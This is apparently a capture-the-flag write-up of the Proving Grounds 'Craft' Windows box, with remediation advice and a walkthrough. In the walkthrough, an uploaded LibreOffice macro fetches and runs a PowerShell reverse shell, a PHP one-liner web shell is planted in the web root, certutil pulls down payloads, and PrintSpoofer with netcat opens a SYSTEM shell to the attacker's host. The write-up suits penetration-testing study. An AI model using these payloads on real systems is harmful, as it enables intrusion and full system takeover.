---
Alias: Craft
Date: 9/14/2022
Platform: Windows
Difficulty: Intermediate
Tags: #macros #LibreOffice #WebRootDirectory #xampp #Htdocs #WindowsServer2019StandardSeImpersonatePrivilegeEscalation #PrintSpoofer64 
Status: Finished
IP: 192.168.229.169
---

# {{Craft}}


# Resolution summary
- Discovered a webpage that allows file uploading
- Started a reverse shell by uploading a.otd file using a macro.
- With user thecybergeek, no privilege escalation path could be found.
- Discovered another non-default Apache user
- Discovered that the user of Cybergeek can write to the C:/xampp/htdocs web root directory.
- Downloaded a cmd.php file to web root directory
- Opened the Firefox php command shell and verified that RCE is the user apache.
- A reverse.ps1 shell was downloaded to the box containing the PHP command shell.
- Using the PHP command shell, the reverse shell was started.
- The Apache user that was found has enabled SeImpersonate privileges. 
- Discovered that the machine is an x64-based PC running Windows Server 2019 Standard with OS Version 10.0.17763.
- Downloaded PrintSpoofer64.exe on the target machine 
- Started the privilege escalation attack PrintSpoofer64.exe and obtained a shell operating as nt/authority system

## Improved skills
- LibreOffice
- Macros
- PrintSpoofer Privilege Escalation
- "cmd /c" shell command
- Powershell "iwr" download command

## Used tools
- nmap
- LibreOffice

### **Vulnerability Explanation:** Initial Access
#### Uploading an .odt File Including A Macro To Launch A Reverse Shell

Type of Vulnerability: Injection (OWASP Top 10), specifically Command Injection
CWE Reference: CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
Proposal for CVSS Score: 9.0 (High)

    Attack Vector (AV): Network
    Attack Complexity (AC): Low
    Privileges Required (PR): None
    User Interaction (UI): Required
    Scope (S): Changed
    Confidentiality (C): High
    Integrity (I): High
    Availability (A): High

This scoring reflects the high impact of a successful exploit where an attacker gains reverse shell access, indicating complete control over the affected system, likely leading to the compromise of confidentiality, integrity, and availability.
Generic Description:

The vulnerability arises when a web application allows users to upload files without proper validation and sanitization. If the application accepts .odt files (OpenDocument Text), which can contain macros, and does not adequately inspect these files for malicious content, an attacker can upload a document embedded with a macro designed to execute arbitrary commands on the server. When this file is processed or opened by the server-side software (e.g., for conversion or preview purposes), the malicious macro can execute, potentially initiating a reverse shell. This reverse shell grants the attacker remote control over the server, posing a severe security risk.
Specific Description:

In this case, the vulnerability stems from the web server's inadequate file upload security measures. By uploading an .odt file containing a macro that launches a reverse shell, an attacker exploits the server's failure to:

    Validate the filetype beyond its extension,
    Inspect the contents for potentially malicious code, and
    Disable the execution of macros within uploaded documents.

Once the server processes this document, the macro executes a shell command that establishes a reverse connection to the attacker’s specified server, thereby compromising the system.

### **Vulnerability Fix:** Initial Access
#### Uploading an .odt File Including A Macro To Launch A Reverse Shell

1. **Implement Strict File Upload Validation:**
    
    - Verify file types using server-side checks, not just by extension, but by inspecting file content for MIME type.
    - Utilize antivirus scanning on uploaded files to detect and block malicious content.
2. **Restrict File Types:**
    
    - Allow only necessary file types. If `.odt` files are not essential, block their upload entirely.
3. **Disable Macros in Document Processing:**
    
    - Configure server-side document processing software to disable macro execution. This can often be done through software settings.
4. **Use Application Allowlisting:**
    
    - Ensure that only known, safe applications can execute on the server, preventing unauthorized commands from running.
5. **Regular Security Training:**
    
    - Conduct regular training for developers and system administrators to recognize and mitigate security risks associated with file uploads and macro execution.
6. **Implement Network Segmentation and Monitoring:**
    
    - Isolate the server within the network to limit the potential impact of a compromise. Monitor network traffic for unusual patterns that may indicate a reverse shell or other malicious activities.

Implementing these measures significantly reduces the risk of a successful attack via malicious file upload, protecting the system's integrity, confidentiality, and availability.

### **Vulnerability Explanation:** Privilege Escalation

#### 1. Writable Root Directory to a Web Server

#### 2. Windows Server 2019 Standard-SeImpersonate Privilege Escalation-PrintSpoofer


### **Vulnerability Explanation:** Privilege Escalation
#### 1. Writable Root Directory to a Web Server

#### Title: Insecure Permissions on Web Server Root Directory

#### Type of Vulnerability: Security Misconfiguration (OWASP Top 10: A6:2017-Security Misconfiguration)

#### CWE Reference: CWE-276: Incorrect Default Permissions

#### Proposal for CVSS Score: 7.5 (High)

- **CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H**
- The score reflects the vulnerability's network accessibility, low attack complexity, no required privileges, and no user interaction. The impact is rated high for integrity and availability because writable root directories can lead to website defacement, deployment of malicious content, and potentially to more severe server-side attacks.

#### Generic Description:

A writable root directory in a web server constitutes a significant security vulnerability. This configuration flaw occurs when the root directory of the web server, which is accessible over the web, is configured with permissions that allow unauthorized users to write or modify files. This can lead to several security risks, including website defacement, the uploading of malicious web shells, data theft, and the distribution of malware to visitors of the website. The issue often arises due to misconfigurations or oversight during the setup of the web server.

#### Specific Description:

The vulnerability is primarily due to inadequate file permissions set on the web server’s root directory. Web servers are typically configured to serve files from a specific directory known as the root directory. When this directory is writable by users other than those administrating the server, it becomes possible for attackers to upload, modify, or delete files. This can be exploited by uploading malicious scripts or content, thereby compromising the server or its hosted applications. The exploitation of this vulnerability does not require authenticated access, making it a critical risk that needs immediate attention.

### **Vulnerability Fix:** Privilege Escalation

#### 1. Writable Root Directory to a Web Server

1. **Review and Restrict Directory Permissions:** Examine the permissions set on the web server’s root directory and ensure that they are restricted to read-only for unauthorized users. Only administrative accounts or specific service accounts required for the operation of legitimate web applications should have write permissions.
    
2. **Implement Proper Access Controls:** Use access control mechanisms to define who can modify the content within the web server’s directories. This should be tightly controlled and monitored.
    
3. **Use a Web Application Firewall (WAF):** Deploy a Web Application Firewall to detect and block attempts to exploit web vulnerabilities, including unauthorized attempts to upload or modify files.
    
4. **Regular Security Audits:** Conduct regular security audits of your web server configurations and permissions to ensure that no insecure permissions are granted due to oversight or configuration changes.
    
5. **Separation of Environments:** Separate development, testing, and production environments and ensure that only necessary files are present in the production environment. This minimizes the risk of accidental exposure of writable directories.
    
6. **Disable Unnecessary Services:** Disable any services or features of the web server that are not required for its operation. This reduces the potential attack surface.
    
7. **File Upload Security:** If your application requires users to upload files, ensure that uploads are handled securely. This includes validating file types, scanning for malware, and storing files in a location outside the web root when possible.
    
8. **Regular Backups and Monitoring:** Maintain regular backups of the web server and hosted content. Implement monitoring to detect unauthorized changes to the website’s files and directories.
    
9. **Educate Developers and Administrators:** Ensure that developers and administrators are aware of the risks associated with writable web directories and train them in secure configuration practices.
    

By addressing this vulnerability with a comprehensive remediation plan, organizations can significantly enhance the security of their web servers and protect against a range of web-based attacks.

### **Vulnerability Explanation:** Privilege Escalation
#### 2. Windows Server 2019 Standard-SeImpersonate Privilege Escalation-PrintSpoofer

#### Overview:

The PrintSpoofer vulnerability exploits the `SeImpersonate` or `SeAssignPrimaryToken` privileges in Windows to escalate privileges through the Windows Print Spooler service. This vulnerability is significant as it allows attackers with limited access to a system to execute arbitrary code with elevated privileges, often SYSTEM, by abusing the Windows Print Spooler service.

#### Type of Vulnerability: Privilege Escalation

#### CWE Reference: CWE-274: Improper Check for Dropped Privileges

#### Generic Description:

In Windows Server 2019 Standard, and potentially other versions, an attacker can exploit the `SeImpersonate` privilege to escalate their privileges to SYSTEM by manipulating the Print Spooler service, specifically through a technique now widely known as PrintSpoofer. This involves creating a malicious service or process that is then impersonated by the Print Spooler, allowing code execution at a higher privilege level. The attack is particularly concerning because it requires only local access and low-level privileges to execute.

#### Specific Risks:

1. **System Compromise**: Successful exploitation allows attackers to gain SYSTEM privileges, the highest level of privileges on Windows systems.
2. **Unauthorized Access and Data Breach**: With SYSTEM access, an attacker can access and exfiltrate sensitive data, install malware, and create backdoors for persistent access.
3. **Lateral Movement**: Elevated privileges can be used to move laterally across the network, compromising other systems and escalating the attack.

### **Vulnerability Fix:** Privilege Escalation

#### 2. Windows Server 2019 Standard-SeImpersonate Privilege Escalation-PrintSpoofer

- **Apply Patches**: Microsoft releases patches to address vulnerabilities, including those related to privilege escalation and the Print Spooler service. Ensure your system is up to date with the latest security updates.
    
- **Disable Unnecessary Services**: If the Print Spooler service is not required, disable it. This can prevent exploitation of vulnerabilities associated with this service. This can be done through the Services management console or PowerShell:
    
    powershell
    

1. `Stop-Service -Name Spooler -Force Set-Service -Name Spooler -StartupType Disabled`
    
2. **Implement Least Privilege Principle**: Ensure users operate with the minimum necessary privileges. Restrict `SeImpersonate` and `SeAssignPrimaryToken` privileges to accounts that specifically require them.
    
3. **Use Endpoint Protection**: Deploy robust endpoint protection solutions that can detect and mitigate exploit attempts targeting known and unknown vulnerabilities.
    
4. **Enable Logging and Monitoring**: Monitor system and security logs for suspicious activities that could indicate an attempted or successful exploitation of this vulnerability. Use tools that can analyze and alert on anomalous behavior.
    
5. **Network Segmentation and Access Controls**: Limit access to critical systems and network segments. Implement strict access controls to reduce the attack surface.
    
6. **Security Awareness**: Train IT staff and users about the potential risks and encourage security best practices, including reporting suspicious activities and not using privileged accounts for routine operations.
    
7. **Regular Security Audits**: Conduct regular security audits and vulnerability assessments to identify and mitigate risks associated with privilege escalation vulnerabilities.
    
8. **Incident Response Plan**: Have a comprehensive incident response plan that includes procedures for dealing with privilege escalation exploits. Ensure that the plan is regularly updated and tested.
    
9. **Backup and Disaster Recovery**: Maintain regular backups and ensure that disaster recovery procedures are in place and effective. This can minimize the impact of a breach or system compromise.
    

By implementing these remediation strategies, organizations can significantly mitigate the risk associated with the PrintSpoofer vulnerability and other similar privilege escalation threats in Windows Server environments. Regular updates, system hardening, and proactive security measures are key to protecting against such vulnerabilities.


---

# Information Gathering
Scanned all TCP ports:
```bash
#Nmap 7.92 scan initiated Sun Aug 21 12:35:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/xml/_full_tcp_nmap.xml 192.168.229.169
Nmap scan report for 192.168.229.169
Host is up, received user-set (0.20s latency).
Scanned at 2022-08-21 12:35:42 PDT for 328s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Craft

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Sun Aug 21 12:41:10 2022 -- 1 IP address (1 host up) scanned in 329.26 seconds
```

Enumerated open TCP ports:
```bash
80
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP (Apache)

- The following webpage was discovered when we navigated to "http://192.168.122.169":
  
![](Images/Pasted%20image%2020230407224047.png)

- We can upload our "resume" to the following link, we found:
  
![](Images/Pasted%20image%2020230407224227.png)

- When we attempt to upload an arbitrary file, we receive the following:
  
![](Images/Pasted%20image%2020230407224319.png)

- We researched the “.odt” file format and found that it is typically created by OpenOffice and LibreOffice Writer programs. We install LibreOffice on our Kali Linux machine and create a macro that initiates a reverse shell.
  
![](Images/Pasted%20image%2020230407224402.png)

![](Images/Pasted%20image%2020230407224442.png)

- On our Kali machine, we execute "sudo apt-get install -y libreoffice-writer" to download LibreOffice.

- After opening LibreOffice, we select "Writer Document":
  
![](Images/Pasted%20image%2020230407224535.png)

- We click Tools > Macros > Organize Macros > Basic:
  
![](Images/Pasted%20image%2020230407224628.png)

- We select "Untitled 1" > "New", give the file the name Offsec1, and then select "OK":

![](Images/Pasted%20image%2020230407224715.png)

- We type Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub". This will initiate an HTTP request to our IP. The following command ought to run if port 80 is being used for hosting and it is open:
  
![](Images/Pasted%20image%2020230407225512.png)

- We click File > Save
  
![](Images/Pasted%20image%2020230407230026.png)

- We name the file “Offesec1” and click Save:
  
![](Images/Pasted%20image%2020230407230118.png)

- We close out of the Offsec.odt document

- We attach the script/macro to an event, by performing the following:

select Tools > Customize.

![](Images/Pasted%20image%2020230407230317.png)

- Select the "Events" tab > click Open Document > click Macro

![](Images/Pasted%20image%2020230407230358.png)

- Double click Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK.

![](Images/Pasted%20image%2020230407230439.png)

- Now an action has been allocated to the Event "Open Document":
  
![](Images/Pasted%20image%2020230407230524.png)

- We click "File" then click "Save"

- To host the.odt file on our Kali machine, we type "updog -p 80" (in the same directory as the freshly created Offsec1.odt file):

![](Images/Pasted%20image%2020230407230715.png)

-We return to the webpage, select "browse," upload our freshly created ".odt" file, and then receive the following screen indicating that the file was approved:

![](Images/Pasted%20image%2020230407230828.png)

![](Images/Pasted%20image%2020230407230856.png)

- A 200 code is received, verifying that the macro was successfully run and the.odt file was uploaded.
  
![](Images/Pasted%20image%2020230407230954.png)

# Exploitation
## Uploading an .odt File Including A Macro To Launch A Reverse Shell

- We return to LibreOffice Basic and select Edit on the offsec1.odt file.

- To download and run the offsec.ps1 reverse shell, we remove the original powershell code that was there and replace it with the following code:

Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")

Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")

![](Images/Pasted%20image%2020230407231101.png)

- We click File and save.

-On our Kali machine, we type vim offsec.ps1.

- We access www.revshells.com.

- We copy the text between the quote marks in the PowerShell #3 tab to copy the contents to the offsec.ps1 file for the Windows payload tab.

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/2affc34d-2b58-4581-96e4-41d7aa74aa00)

- To make offsec.ps1 executable, we type "chmod 775 offsec.ps1".

- As port 8080 was supplied in the Powershell one liner reverse shell (offsec.ps1), we establish a listener to listen on that port.

- A Windows reverse shell is obtained after we reupload the offsec1.odt file.

![](Images/Pasted%20image%2020230407231504.png)

# Lateral Movement to user
#### Uploading a PHP Webshell root directory of web server leading to RCE and a reverse shell

- We type whoami and discover that we are thecybergeek user.

- We run privesc scripts, but find no privilege escalation vectors.

- We find default users and user apache when we type "net users".

- We locate the "xampp" directory by navigating to the "C:" directory.

- We navigate to xampp and locate the htdocs directory, which is the Craft website's root directory.

- We determine that we have write permissions after attempting to write to the directory to verify:

![](Images/Pasted%20image%2020230407231750.png)

- We search "php one liner command shell" on Google.
  
- On our Kali machine, we paste the contents of the text below into a "cmd.php" file.
  
<?php system($_GET['cmd']); ?>

- We transfer the cmd.php file into the shell's htdocs directory.
  
- We discover that we have command execution as apache when we browse to http://192.168.98.169/cmd.php?cmd=whoami in Firefox.
  
![](Images/Pasted%20image%2020230407231839.png)

We then searched for a privilege escalation vector and discovered that a non-default user "apache" had write access to the web root directory. We downloaded a PHP command shell to the web root directory and navigated to it using Firefox. We confirmed that we had RCE as the "apache" user.

- On port 8081, we launch a netcat listener.

- We create a powershell reverse shell named reverse.ps1:

![](Images/Pasted%20image%2020230407231917.png)

- To host the file, we launch an HTTP server in the directory containing reverse.ps1.

- We use Firefox to download the reverse.ps1 file to the destination by entering the following command:
  
http://192.168.98.169/cmd.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http://192.168.49.98:82/reverse.ps1%20reverse.ps1

- To run the payload, we enter the following command and, as user Apache, receive a reverse shell:
  
http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.ps1

![](Images/Pasted%20image%2020230407232026.png)
---

# Privilege Escalation
## Local Enumeration

- We discover that the Apache user has SeImpersonatePrivilege enabled when we type whoami /all.
  
![](Images/Pasted%20image%2020230407232107.png)

- We enter systeminfo to discover that the machine is an x64-based PC running Windows Server 2019 Standard on OS Version 10.0.17763.
  
![](Images/Pasted%20image%2020230407232156.png)

![](Images/Pasted%20image%2020230407232222.png)

- Using PrintSpoofer64.exe, we can escalate privileges per the following webpage found when we search for "Windows Server 2019 Standard SeImpersonate privilege escalation" on Google:
  
![](Images/Pasted%20image%2020230407232311.png)

![](Images/Pasted%20image%2020230407232337.png)


## Privilege Escalation vector
## Windows Server 2019 Standard-SeImpersonate Privilege Escalation-PrintSpoofer

We downloaded PrintSpoofer64.exe on the target machine and initiated the PrintSpoofer64.exe privilege escalation exploit, which gave us a shell running as nt/authority system.

- On our Kali computer, we launch a web server to host PrintSpoofer64.exe.
  
- We input the below command to download it to the target machine:
  
certutil.exe -urlcache -split -f http://192.168.49.98:81/PrintSpoofer64.exe PrintSpoofer64.exe

![](Images/Pasted%20image%2020230407232418.png)

- We transfer nc64.exe binary from our Kali machine to the target machine as well.
  
-We launch a netcat listener on port 1337 on our Kali machine and type the following command on the target machine to obtain a shell as nt/authority system:

./PrintSpoofer64.exe -c "nc64.exe 192.168.49.98 1337 -e cmd"

![](Images/Pasted%20image%2020230407232506.png)

![](Images/Pasted%20image%2020230407232534.png)
